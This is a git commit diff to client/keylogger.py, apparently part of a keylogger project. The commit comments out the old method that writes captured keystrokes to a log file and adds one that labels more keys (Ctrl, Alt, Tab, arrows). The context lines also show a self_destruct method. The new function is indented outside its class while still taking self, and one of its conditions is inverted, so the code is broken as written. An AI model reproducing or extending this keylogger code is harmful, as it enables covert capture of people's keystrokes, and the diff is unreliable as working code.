bd9992dbb0f310ab4a055b92ceabfd44f56a143a
Zepher Ashe <safesploit@users.noreply.github.com>
2023-07-22 02:23:08 +0100

    v0.12.0-alpha
    added more keys to write_file()

--- client/keylogger.py
+++ client/keylogger.py
@@ -34,24 +34,57 @@ class Keylogger():
         with open(self.path, 'rt') as f:
             return f.read()
 
-    def write_file(self, keys):
-        with open(self.path, 'a') as f:
-            for key in keys:
-                k = str(key).replace("'", "")
-                if k.find('backspace') > 0:
-                    f.write(' [BACKSPACE] ')
-                elif k.find('enter') > 0:
-                    f.write('\n')
-                # elif k.find('control') > 0:   #doesn't currently work
-                #     f.write(' [CTRL] ')
-                elif k.find('shift') > 0:
-                    f.write(' [SHIFT] ')
-                elif k.find('space') > 0:
-                    f.write(' ')
-                elif k.find('caps_lock') > 0:
-                    f.write(' [CAPS_LOCK] ')
-                elif k.find('Key'):
-                    f.write(k)
+    # def write_file(self, keys):
+    #     with open(self.path, 'a') as f:
+    #         for key in keys:
+    #             k = str(key).replace("'", "")
+    #             if k.find('backspace') > 0:
+    #                 f.write(' [BACKSPACE] ')
+    #             elif k.find('enter') > 0:
+    #                 f.write('\n')
+    #             # elif k.find('control') > 0:   #doesn't currently work
+    #             #     f.write(' [CTRL] ')
+    #             elif k.find('shift') > 0:
+    #                 f.write(' [SHIFT] ')
+    #             elif k.find('space') > 0:
+    #                 f.write(' ')
+    #             elif k.find('caps_lock') > 0:
+    #                 f.write(' [CAPS_LOCK] ')
+    #             elif k.find('Key'):
+    #                 f.write(k)
+def write_file(self, keys):
+    with open(self.path, 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find('backspace') > 0:
+                f.write(' [BACKSPACE] ')
+            elif k.find('enter') > 0:
+                f.write('\n')
+            elif k.find('shift') > 0:
+                f.write(' [SHIFT] ')
+            elif k.find('space') > 0:
+                f.write(' ')
+            elif k.find('caps_lock') > 0:
+                f.write(' [CAPS_LOCK] ')
+            elif k.find('ctrl') > 0:
+                f.write(' [CTRL] ')
+            elif k.find('alt') > 0:
+                f.write(' [ALT] ')
+            elif k.find('tab') > 0:
+                f.write(' [TAB] ')
+            elif k.find('left') > 0:
+                f.write(' [LEFT_ARROW] ')
+            elif k.find('right') > 0:
+                f.write(' [RIGHT_ARROW] ')
+            elif k.find('up') > 0:
+                f.write(' [UP_ARROW] ')
+            elif k.find('down') > 0:
+                f.write(' [DOWN_ARROW] ')
+            elif k.find('Key'):
+                f.write(' [OTHER_KEY: ' + k + '] ')
+            else:
+                f.write(k)
+
 
     def self_destruct(self):
         self.flag = 1
